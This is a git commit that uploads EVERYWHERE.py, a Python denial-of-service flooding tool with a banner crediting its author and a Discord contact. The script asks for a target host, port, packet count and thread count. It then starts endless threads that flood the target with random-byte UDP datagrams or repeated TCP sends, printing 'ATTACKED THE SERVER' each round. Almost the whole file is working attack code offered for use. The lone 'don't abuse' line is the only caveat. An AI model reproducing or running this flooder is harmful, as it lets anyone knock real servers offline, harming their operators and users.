366f8b27bbfeb059a273ac9b3a7919b4b7cd80ac
EveryTeams <108595344+EveryTeams@users.noreply.github.com>
2022-07-03 07:37:46 +0700

    Add files via upload

---
+++ EVERYWHERE.py
@@ -0,0 +1,56 @@
+#!/usr/bin/env python3
+import random
+import socket
+import threading
+     
+print (" ╔═╗╦      ╦╔═╗╦═╗╦   ╦╦   ╦╦  ╦╔═╗╦═╗╔═╗")     
+print (" ║╣   ╚╗╔╝║╣   ╠╦╝╚╦╝║║║╠═╣║╣  ╠╦╝║╣")
+print (" ╚═╝   ╚╝   ╚═╝╩╚═   ╩  ╚╩╝ ╩  ╩╚═╝╩╚═╚═╝")                                                          
+
+print       (">> WELCOME TO COMUNITY EVERYWHERE <<")
+print       (" >> TOOLS CREATED BY Xs AlLexa <<")
+print       (">> DON'T ABUSE MY TOOLS <<") 
+print       (" >> DISCORD : AlLexa#8656 << ")                      
+print       (" >> DM ME IF YOU NEED HELP <<")
+
+    
+ip = str(input("  HOST/IP:"))
+port = int(input(" Port:"))
+choice = str(input(" Gass Entot?(y/n):"))
+times = int(input(" Paket:"))
+threads = int(input(" Threads:"))
+def run():
+	data = random._urandom(1000)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Xs EVERYWHERE ATTACKED THE SERVER")
+		except:
+			print("[!] ERROR SERVER TIME OUT")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Xs EVERYWHERE ATTACKED THE SERVER ")
+		except:
+			s.close()
+			print("[*] ERROR SERVER TIME OUT")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
